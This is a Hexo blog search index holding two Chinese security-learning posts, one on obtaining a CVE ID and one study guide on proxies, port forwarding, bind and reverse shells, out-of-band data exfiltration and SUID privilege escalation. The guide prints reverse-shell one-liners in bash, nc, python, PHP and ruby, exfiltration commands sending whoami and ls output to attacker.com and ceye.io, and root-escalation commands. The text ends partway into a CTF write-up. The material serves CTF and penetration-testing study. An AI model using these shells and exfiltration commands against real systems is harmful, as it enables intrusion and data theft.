<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE_BLOG</title>
    <link href="/2025/11/13/CVE-BLOG/"/>
    <url>/2025/11/13/CVE-BLOG/</url>
    
    <content type="html"><![CDATA[<blockquote><p>i4g5d填上小白网安履历的第一步，获取一个个人CVE编号（开源且很捡漏项目，水洞，仅作为一次记录，大佬勿喷😭）</p></blockquote><h1 id="1-CVE介绍"><a href="#1-CVE介绍" class="headerlink" title="1. CVE介绍"></a>1. CVE介绍</h1><ul><li>CVE的全称是“Common Vulnerabilities and Exposures”翻译成中文就是“公共漏洞和披露”可以把它理解成一个被安全从业者认可的漏洞字典，大家可以通过编号在这里查找不同应用或系统的漏洞信息。当然很多安全企业或国家机构也都会引用CVE作为其漏洞库，比如美国国家漏洞数据库（NVD）。</li><li>CNA的全称是“CVE Numbering Authority”中文可以理解为“CVE编号授权机构”顾名思义就是这些CNA有权限分配和管理CVE编号，截止目前为止，共有85个CNA，覆盖14个国家。CNA包括供应商（比如苹果、谷歌等公司）和项目发起机构，漏洞研究人员、国家和行业CERT以及漏洞奖励计划组织。这些CNA可以构建CVE列表，并分配列表中的CVE编号和录入相关信息。</li></ul><h1 id="2-CVE申请"><a href="#2-CVE申请" class="headerlink" title="2.CVE申请"></a>2.CVE申请</h1><h2 id="2-1-VulDB"><a href="#2-1-VulDB" class="headerlink" title="2.1 VulDB"></a>2.1 <a href="https://vuldb.com/?id.add">VulDB</a></h2><p>VulDB的申请方式非常简单，很方便，也是我的第一个CVE的获取渠道</p><p><img src="/2025/11/13/CVE-BLOG/image-20251113231353634.png"></p><ul><li>Vendor：厂商名称。(填写资产所属的厂商，小开源项目就填写作者名字&#x2F;有些是填项目链接)</li><li>product：产品名称。（这里也是可以直接填名字）</li><li>class：漏洞类型</li></ul><p><img src="/2025/11/13/CVE-BLOG/image-20251113231725872.png"></p><p>下面就是对漏洞进行简单的说明，现在Description进行简单的描述，下面写一个具体POC&#x2F;Exploit的链接，可以是一个公开文档，也可以是github公开项目，也可以是个人博客。</p><p>发送后VulDB会发送邮件表示成功收到</p><p><img src="/2025/11/13/CVE-BLOG/image-20251113232015769.png"></p><p>接下来就是漫长的等待，两到三周成功分配</p><p><img src="/2025/11/13/CVE-BLOG/image-20251113232105891.png"></p><p>随后再主页能搜索到编号</p><h2 id="2-2-cveform"><a href="#2-2-cveform" class="headerlink" title="2.2 cveform"></a>2.2 <a href="https://cveform.mitre.org/">cveform</a></h2><p>这个平台原本说非CNA的洞在这交快，但我在两个平台都申请了同一个CVE（理论上不可以，我也很后悔），还是VulDB更加简单更快</p><p>选择申请CVE ID</p><p><img src="/2025/11/13/CVE-BLOG/image-20251113232821826.png"></p><p>后面填的信息更复杂了，我也不明白填的这么详细审核为什么还这么慢</p><p><img src="/2025/11/13/CVE-BLOG/image-20251113232913789.png"></p><ul><li><strong>Vendor of the product(s)</strong> ：我填了项目连接，但也许直接填作者名字也可以</li><li><strong>Attack type</strong>：分为<code>content-dependent</code>,<code>local</code>,<code>remote</code>,<code>physical</code></li><li><strong>Impact</strong>：漏洞的影响，这种拿不准就把报告甩给ai问</li></ul><p>再下面的漏洞介绍填的都大差不差，借用一下别人的教程</p><p><img src="/2025/11/13/CVE-BLOG/15233541202833.png"></p><p>后面官方会给你发个邮件</p><p><img src="/2025/11/13/CVE-BLOG/image-20251113233441684.png"></p><p>依旧漫长等待（waiting）网上都说1.2天就下来了，不知道为什么等了2周还没来</p><h1 id="3-Next"><a href="#3-Next" class="headerlink" title="3.Next"></a>3.Next</h1><p>拿到了水洞CVE，希望后面能挖到大厂CVE。</p><p>后面就是学习资产搜集，尝试挖一下SRC</p>]]></content>
    
    
    <categories>
      
      <category>渗透/挖洞/攻击</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxy&amp;Connect&amp;shell</title>
    <link href="/2025/11/06/shell/"/>
    <url>/2025/11/06/shell/</url>
    
    <content type="html"><![CDATA[<blockquote><p>无论是CTF，渗透测试，或者漏洞挖掘，都是一定程度上对靶机的操控。</p><p>有时候只是一个命令执行环境，有时候能拿到shell提权。</p><p>本文学习并探讨代理，连接，shell 等</p></blockquote><p><a href="https://blog.csdn.net/weixin_45936149/article/details/123752352">正向shell和反弹shell</a></p><h1 id="1-代理（Proxy）"><a href="#1-代理（Proxy）" class="headerlink" title="1.代理（Proxy）"></a>1.代理（Proxy）</h1><p>​代理：一个实体代表另一个实体执行某种任务或行动的机制。</p><p>代理可以是一个 服务器或计算机，充当客户端和目标服务器之间的中介。网络代理可以用于多种目的，如加速数据传输、缓存、过滤内容、保护隐私、绕过防火墙等。常见的网络代理类型包括代理服务器、反向代理和内容分发网络（CDN）。</p><p>代理服务器：位于服务器和客户端之间，用于转发请求，帮助隐藏ip，提高访问效率</p><h2 id="1-1-正向代理"><a href="#1-1-正向代理" class="headerlink" title="1.1 正向代理"></a>1.1 正向代理</h2><p>正向代理服务器由我们（客户端）配置，代表客户端向服务器发送请求。</p><p>客户端需要访问互联网资源时，向正向代理发送请求，正向代理转发给服务器，得到响应返回给客户端。</p><p>正向代理可隐藏IP，访问限制内容，过滤和加速请求。利用多个代理服务器转发请求可以防止被他人查到真实身份。</p><p><img src="/2025/11/06/shell/image-20251106173303646.png"></p><h2 id="1-2-反向代理"><a href="#1-2-反向代理" class="headerlink" title="1.2 反向代理"></a>1.2 反向代理</h2><p>反向代理就是代表服务器执行请求。</p><p>反向代理通常用于均衡负载，SSL终!止，内容缓存，保护后端服务器和隐藏后端服务器身份等</p><p><img src="/2025/11/06/shell/image-20251106173841254.png"></p><h1 id="2-连接-Shell"><a href="#2-连接-Shell" class="headerlink" title="2. 连接&amp;Shell"></a>2. 连接&amp;Shell</h1><h2 id="2-1-连接"><a href="#2-1-连接" class="headerlink" title="2.1 连接"></a>2.1 连接</h2><p>首先，先理解正向&#x2F;反向连接。正向连接是指由客户端向服务端发起连接请求，反之就是反向连接。</p><h3 id="2-1-1-端口映射"><a href="#2-1-1-端口映射" class="headerlink" title="2.1.1 端口映射"></a>2.1.1 端口映射</h3><p>端口映射就是<strong>将内网中的主机的一个端口映射到路由器的公网ip的一个端口</strong>，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。<br>比如我们在内网中有一台Web服务器，但是外网中的用户是没有办法直接访问该服务器的。于是我们可以在路由器上设置一个端口映射，只要外网用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主的主机</p><h3 id="2-1-2-端口转发"><a href="#2-1-2-端口转发" class="headerlink" title="2.1.2 端口转发"></a>2.1.2 端口转发</h3><p>端口转发(Port forwarding)，有时被叫做隧道，是安全壳(SSH) 为网络安全通信使用的一种方法。端口转发是指通过路由器或防火墙，<strong>将外部访问请求（通常基于IP和端口号）转发到内网特定设备</strong>的技术。它是解决内网设备无法直接被外网访问的关键技术之一。</p><p>比如，我们现在在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。假如我们内网现在有100台主机，那么我们现在都是通过路由器的这一个公网IP和外网通信的。那么，当互联网上的消息发送回来时，路由器是怎么知道这个消息是给他的，而另外消息是给你的呢?这就要我们的ip地址和路由器的端口进行绑定了，这时，在路由器中就会有一个内网ip和路由器端口对应的一张表。当路由器的10000端口收到消息时，就知道把消息发送给他，而当20000端口收到消息时，就知道把消息发送给你。这就是端口转发，其转发一个端口收到的流量，给另一个主机。</p><h3 id="2-1-3-端口转发解决目标机器不出网"><a href="#2-1-3-端口转发解决目标机器不出网" class="headerlink" title="2.1.3 端口转发解决目标机器不出网"></a>2.1.3 端口转发解决目标机器不出网</h3><p><strong>端口转发</strong>可以让我们通过中间主机将特定流量转发到目标主机或从目标主机引导流量到外部网络。</p><p><strong>本地端口转发（Local Port Forwarding）</strong>： 攻击者将目标主机的某些服务通过中间主机转发到攻击者的本地端口，这样攻击者可以像在本地访问这些服务一样。</p><p><strong>示例</strong>：通过SSH端口转发，访问目标内网中的数据库服务器。</p><p><strong>命令示例</strong>：</p><ul><li><code>ssh -L 8080:target_internal_host:80 user@jump_host</code></li><li>这将目标主机的80端口转发到攻击者本地的8080端口。</li><li>target_internal_host：目标主机</li><li>jump_host：中间主机，即控制后做的代理主机</li></ul><p><strong>远程端口转发（Remote Port Forwarding）</strong>： 目标主机无法主动访问外部网络时，可以通过目标主机将流量反向转发到攻击者的主机。</p><p>示例：当目标主机无法直接访问互联网，但攻击者主机可以通过目标主机来转发请求。这个命令需在目标机器上执行。</p><p><strong>命令示例</strong>：</p><ul><li><code>ssh -R 8080:localhost:80 user@attacker_machine</code></li><li>这将攻击者的8080端口转发给目标主机，使得目标主机可以通过攻击者的端口访问外部。</li><li>localhost：靶机IP</li><li>attacker_machine：攻击机IP</li></ul><p>所谓的反弹shell就是客户端监听特定端口，服务端反向连接，发起请求到那个端口，建立起shell连接。</p><h2 id="2-2-正向shell"><a href="#2-2-正向shell" class="headerlink" title="2.2 正向shell"></a>2.2 正向shell</h2><blockquote><p>正向连接（Forward Connection）：正向连接是一种常见的网络通信模式，其中客户端主动发起连接到服务器或目标系统。正向连接通常用于客户端-服务器通信，客户端主动请求服务或资源，例如网页浏览、电子邮件发送和接收等。在正向连接中，客户端充当主动方，向服务器发起连接请求，然后服务器接受并处理请求。</p></blockquote><p>正向shell就是攻击者主动连接靶机，取得shell。   通俗一点就是靶机（受害者）自己绑定监听 了某个端口，等攻击者连接后，靶机将收到的数据给shell（cmd或bash），执行结果在丢给攻击机。</p><p>本机上模拟：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">靶机（受害者）：ncat -lvp <span class="hljs-number">1234</span> -e cmd<span class="hljs-selector-class">.exe</span>        <span class="hljs-comment">//监听1234端口，并把收到的信息扔给cmd</span><br>攻击者：       ncat <span class="hljs-number">172.18</span>.<span class="hljs-number">128.1</span> <span class="hljs-number">1234</span>           <span class="hljs-comment">//连接靶机的1234端口</span><br></code></pre></td></tr></table></figure><p>两个关键点：</p><ol><li>防火墙可能会阻止正向shell</li><li>如何让靶机绑定端口，并重定向给shell</li></ol><p>先看<strong>第一点</strong>，如果有防火墙存在，会使nmap扫出来有<code>filtered</code>,端口关闭状态<code>closed</code>,服务运行状态<code>open</code>。实际很难绕过防火墙或者环境极其特殊。</p><blockquote><p>比如下图中，open是已经占用的端口，说明已经有进程监听，关掉监听，扫一下1234，就是close</p></blockquote><p><img src="/2025/11/06/shell/image-20251106193859800.png"></p><p><img src="/2025/11/06/shell/image-20251106210456156.png"></p><p>所以如果看到有防火墙且没有可利用的<code>open</code>端口，直接放弃正向shell</p><p><strong>第二点</strong>，如何绑一个正向shell到靶机</p><ol><li><p>若靶机有环境，可以用python，C等语言写一个socket</p></li><li><p>若是linux有nc 可用 <code>nc -l 端口-e /bin/bash</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>nc -l <span class="hljs-number">1234</span> -e bin/bash<br></code></pre></td></tr></table></figure><p>若靶机是windows没有nc，若存在文件上传，就要给靶机上传一个nc.exe</p></li><li><p>若可传木马，MSFvenom生成shell木马</p><p>（注意，MSF生成的payload得用MSF打）</p><p><img src="/2025/11/06/shell/image-20251106214349759.png"></p><p>这是生成，后面可以用nc，curl，weget等上传shell，通用有777的文件夹&#x2F;tmp或&#x2F;opt（cmd&#x3D;&#x2F;opt&#x2F;bindshell）</p><p>这只是演示，实际用了MSF只能用MSF打，选explout&#x2F;muliti&#x2F;handler模块</p><p><img src="/2025/11/06/shell/image-20251106214719684.png"></p></li></ol><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="2-3-反弹shell"><a href="#2-3-反弹shell" class="headerlink" title="2.3 反弹shell"></a>2.3 反弹shell</h2><blockquote><p>反向连接就是让靶机（受害者）主动连接攻击者。</p></blockquote><p>反向shell是靶机带着shell连接攻击机，这就说明不用管防火墙。 但也有缺点，攻击机必须能被主动寻址(若攻击机在内网ip或经过NAT，这时靶机无法反弹shell)。（但其实开个公网隧道就好了）</p><h3 id="2-3-1-bash反弹"><a href="#2-3-1-bash反弹" class="headerlink" title="2.3.1 bash反弹"></a>2.3.1 bash反弹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i&gt;&amp; /dev/tcp/攻击机ip/攻击机监听port 0&gt;&amp;1<br></code></pre></td></tr></table></figure><blockquote><p><code>bash</code>就是调用Bash解释器</p><p><code>-i</code> 就是启动交互模式，让bash作为交互shell工作（使攻击像一个交互终端）</p><p><code>&gt;&amp;</code>表示将 “标准输出（stdout，文件描述符 1）” 和 “标准错误（stderr，文件描述符 2）”<strong>合并后重定向</strong>到后面的目标（这里就是前面的 TCP 连接）。</p><p>(输入：0，输出：1，错误：2)</p><p><code>&gt;&amp; /dev/tcp/192.168.0.1/1234</code> 就是<code>&gt;&amp; filename</code>是重定向语法    在 bash 常用作把 <strong>stdout</strong> 和 <strong>stderr</strong> 一并重定向到指定目标。因此这部分把标准输出（fd 1）和标准错误（fd 2）都发送到这个 TCP 连接上。</p><p><code>0&gt;&amp;1</code>将（用户） “标准输入” 重定向到 “标准输出所指向的地方”（也就是前面的 TCP 连接）。</p><p>记得做webshell可能要url编码，<code>&amp;</code>&#x3D;&gt;<code>%26</code></p></blockquote><p><img src="/2025/11/06/shell/image-20251106223242457.png"></p><p>倘若目标系统不是默认bash，需要bash -c包裹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -c &#x27;bash -i&gt;&amp; /dev/tcp/攻击机ip/攻击机port 0&gt;&amp;1&#x27;<br></code></pre></td></tr></table></figure><p>比如kali的zsh就不是默认bash</p><p><img src="/2025/11/06/shell/image-20251106221550753.png"></p><h3 id="2-3-2-nc反弹"><a href="#2-3-2-nc反弹" class="headerlink" title="2.3.2 nc反弹"></a>2.3.2 nc反弹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc 192.168.106.133 4444 -e /bin/bash    //连接攻击机 用bash<br>nc -l 4444|bash|nc 192.168.106.133 5555   //没有-e时<br></code></pre></td></tr></table></figure><p><img src="/2025/11/06/shell/image-20251106222108826.png"></p><p>第二个命令比较巧妙，要一个连接一个反弹</p><p><img src="/2025/11/06/shell/image-20251106225005108.png"></p><details>    <summary>Linux常见反弹shell</summary><p><strong>bash反弹shell</strong></p><ul><li>nc -lvp 4444</li><li>bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.12&#x2F;4444 0&gt;&amp;1</li></ul><p><strong>nc反弹shell</strong></p><ul><li>nc -lvp 4444</li><li>nc 192.168.11.12 666 &#x2F;bin&#x2F;bash | nc 192.168.11.12 666</li><li>nc 192.168.11.12 999 -e &#x2F;bin&#x2F;bash Linux</li></ul><p><strong>python反弹shell</strong></p><ul><li>nc -lvp 9999</li><li>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.11.12”,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</li></ul><p><strong>PHP反弹shell</strong></p><ul><li>nc -lvp 6666</li><li>php -r ‘$sock&#x3D;fsockopen(“192.168.11.12”,6666);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li></ul><p><strong>ruby反弹shell</strong></p><ul><li>nc -lvp 4444</li><li>ruby -rsocket -e’f&#x3D;TCPSocket.open(“192.168.11.12”,4444).to_i;exec sprintf(“&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</li></ul><p><a href="https://www.freebuf.com/articles/network/334613.html">more…</a></p><p>​    </p></details><p></p><h1 id="3-OOB带外"><a href="#3-OOB带外" class="headerlink" title="3. OOB带外"></a>3. OOB带外</h1><p>无回显时使用OOB带外</p><p>可参考<a href="https://sakurahack-y.github.io/">OOB外带攻击</a></p><h2 id="3-1-可出网主机："><a href="#3-1-可出网主机：" class="headerlink" title="3.1 可出网主机："></a>3.1 可出网主机：</h2><p><strong>使用http传输，如wget，curl，certutil将回显信息爬出</strong></p><ul><li><p>** 优点**：方便，回显全。</p></li><li><p>** 缺点**：对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出</p></li></ul><h2 id="3-2-不出网主机："><a href="#3-2-不出网主机：" class="headerlink" title="3.2 不出网主机："></a>3.2 不出网主机：</h2><p><strong>使用DNS（ping，nslookup）传输，ICMP传输，powershell中的wget，curl等传输</strong></p><ul><li><p>** 优点**：不出网机器可以传输</p></li><li><p>** 缺点**：1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦<br>2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻</p></li></ul><p>更具我的经验</p><p>利用BURP的collaborator，或者<a href="http://dnslog.cn/">dnslog</a>  <a href="http://ceye.io/">ceye</a></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">dns:</span><br><span class="hljs-built_in">ping %</span>USERNAME%.attacker.com<br>ping `whoami`.attacker.com<br>nslookup $(whoami).attacker.com<br><br><span class="hljs-title">http:</span><br><span class="hljs-title">https:</span>//attacker.com?foo=(要带出的)<br>curl `whoami`.attacker.com(attacker.com/`whoami`)<br></code></pre></td></tr></table></figure><p>windows系统shell带外命令</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haml">windows中 %xxx% 的xxx代表系统变量,常用系统变量命令<br><span class="hljs-tag">              %<span class="hljs-selector-tag">SystemDrive</span></span>%                                     系统安装的磁盘分区<br><span class="hljs-tag">              %<span class="hljs-selector-tag">SystemRoot</span></span>% = %Windir% WINDODWS                  系统目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">ProgramFiles</span></span>%　                                  应用程序默认安装目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">AppData</span></span>%                                         应用程序数据目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">CommonProgramFiles</span></span>%                              公用文件目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">HomePath</span></span>%                                        当前活动用户目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">Temp</span></span>% =%Tmp%                                     当前活动用户临时目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">DriveLetter</span></span>%                                     逻辑驱动器分区<br><span class="hljs-tag">              %<span class="hljs-selector-tag">HomeDrive</span></span>%                                       当前用户系统所在分区<br></code></pre></td></tr></table></figure><p>HTTP:</p><p>有时候ls等很多换行导致信息显示不全，可以借用sed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl XXX.ceye.io/`<span class="hljs-built_in">ls</span> -al|sed -n <span class="hljs-string">&#x27;2p&#x27;</span>` //这里回显的就是第二行数据了<br>curl XXX.ceye.io/`<span class="hljs-built_in">ls</span> -al|sed -n <span class="hljs-string">&#x27;2p&#x27;</span>|<span class="hljs-built_in">base64</span>`   <span class="hljs-built_in">base64</span>传输<br>curl XXX.ceye.io/`<span class="hljs-built_in">ls</span> -al |<span class="hljs-built_in">cut</span> -c 3-10`   分割<br></code></pre></td></tr></table></figure><p><img src="/2025/11/06/shell/image-20251108210153355.png"></p><p><img src="/2025/11/06/shell/image-20251108210204163.png"></p><p>或者wget：结合header查看，可以用collaborator</p><p><strong>使用wget将命令回显信息通过包头数据字符串YJH传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">wget <span class="hljs-attr">--header</span>=<span class="hljs-string">&quot;YJH:`ls | xargs echo –n`&quot;</span> <span class="hljs-number">8</span>lusscjjxlskqnabjvzwhmj3nutlhb50<span class="hljs-selector-class">.oastify</span>.com<br></code></pre></td></tr></table></figure><p><img src="/2025/11/06/shell/image-20251108214925226.png"></p><p><img src="/2025/11/06/shell/image-20251108214945868.png"></p><p>DNS:</p><p>ping或nslookup ，只能短信息回显</p><p><img src="/2025/11/06/shell/image-20251108213941155.png"></p><p><img src="/2025/11/06/shell/image-20251108213948160.png"></p><h1 id="4-权限和提权（Permissions）"><a href="#4-权限和提权（Permissions）" class="headerlink" title="4. 权限和提权（Permissions）"></a>4. 权限和提权（Permissions）</h1><blockquote><p>到里只是小白的记录，这里有更详细的<a href="https://blog.csdn.net/uuzeray/article/details/136098183">【Web】超级详细的Linux权限提升一站式笔记</a></p></blockquote><h2 id="4-1-前置"><a href="#4-1-前置" class="headerlink" title="4.1 前置"></a>4.1 前置</h2><p>Linux每个文件 &#x2F; 目录的权限都针对三类<strong>对象</strong>设置：</p><ul><li><strong>u（user）</strong>：文件的所有者（创建者）。</li><li><strong>g（group）</strong>：文件所属组的成员。</li><li><strong>o（others）</strong>：既不是所有者也不属于所属组的其他用户。</li></ul><p>每个对象有三种<strong>基础权限</strong>：</p><ul><li><strong>r（read，读）</strong>：对文件可查看内容；对目录可列出文件（<code>ls</code>）。</li><li><strong>w（write，写）</strong>：对文件可修改内容；对目录可增删文件 &#x2F; 改名（需同时有执行权限）。</li><li><strong>x（execute，执行）</strong>：对文件可运行（如脚本、程序）；对目录可进入（<code>cd</code>）。</li></ul><p><strong>表示方法</strong>有两种：字母和数字</p><ul><li>u：<code>rwx</code>（可读、可写、可执行）；g：<code>r-x</code>（可读、可执行，不可写）；o：<code>r--</code>（仅可读）</li><li><code>r=4</code>，<code>w=2</code>，<code>x=1</code>，权限组合为数字相加：<ul><li><code>rwx = 4+2+1 = 7</code></li><li><code>r-x = 4+0+1 = 5</code></li><li><code>r-- = 4+0+0 = 4</code></li></ul></li></ul><p>然后可以后期<strong>修改权限</strong>，用到<code>chmod</code>：<code>chmod [权限] 文件名</code></p><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> [u/g/o/a][+/-/=][r/w/x] 文件名<br><span class="hljs-built_in">chmod</span> g-w,o+x file.txt     //给g移除写权限，给o增加执行权限<br><span class="hljs-built_in">chmod</span> 755 script.sh       //所有者u享有rwx权限，g和o r-x不可写<br></code></pre></td></tr></table></figure><p><strong>特殊权限</strong>：</p><ul><li><p>4000（Set Uid；SUID）</p><p>表示用户执行文件时，临时获得所有者u的权限。例如<code>chmod 4755 1.txt</code>就是临时享有o的7权限</p></li><li><p>2000（Set Gid；SGID）</p><p>对文件：执行时临时获得文件<strong>所属组g的权限</strong>；对目录：在该目录下创建的新文件，所属组会继承目录的所属组（常用于团队共享目录）。</p></li><li><p>1000（Sticky Bit，粘滞位）</p><p>仅对目录有效，目录内的文件<strong>只有所有者u或 root 才能删除</strong></p></li></ul><h2 id="4-2-SUID提权"><a href="#4-2-SUID提权" class="headerlink" title="4.2  SUID提权"></a>4.2  SUID提权</h2><p>根据我浅显的CTF经验，提权通常能利用权限较高的文件</p><ol><li><p>查找具有SUID权限（或其他需要的权限）的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;  //从根目录搜索 “属于 root 用户” 且 “具有 SUID 权限” 的文件 / 目录，并显示其详细信息。<br>find / -perm -u=s -type f 2&gt;/dev/null             //从根目录搜索 “具有 SUID 权限的普通文件”，并忽略错误输出<br>find / -user root -perm -4000-print 2&gt;/dev/null   //打印路径，忽略错误输出<br></code></pre></td></tr></table></figure></li><li><p>利用文件</p><p>在<a href="https://gtfobins.github.io/">GTFOBins </a>查找命令，并使用高权限文件来达到可执行的操作</p><p>例如常见的几个</p><table><thead><tr><th>suid文件</th><th>提权命令</th></tr></thead><tbody><tr><td>&#x2F;usr&#x2F;bin&#x2F;bash</td><td>bash -p</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;csh</td><td>csh -b</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;sh</td><td>sh -p</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;ksh</td><td>ksh -p</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;zsh</td><td>zsh</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;find</td><td>find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;awk</td><td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;man</td><td>!&#x2F;bin&#x2F;bash</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;more</td><td>!&#x2F;bin&#x2F;bash</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br>touch 1.txt #创建1.txt<br>/usr/bin/find 1.txt -exec whoami ;<br></code></pre></td></tr></table></figure><details>    <summary>分享一个入坑的shell提权CTF</summary><p>​    [GHCTF 2025]GetShell</p><img src="/2025/11/06/shell/image-20251109173233006.png"><p>进入靶场就是一长串代码，定义了一堆类，直接扔给ai审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span 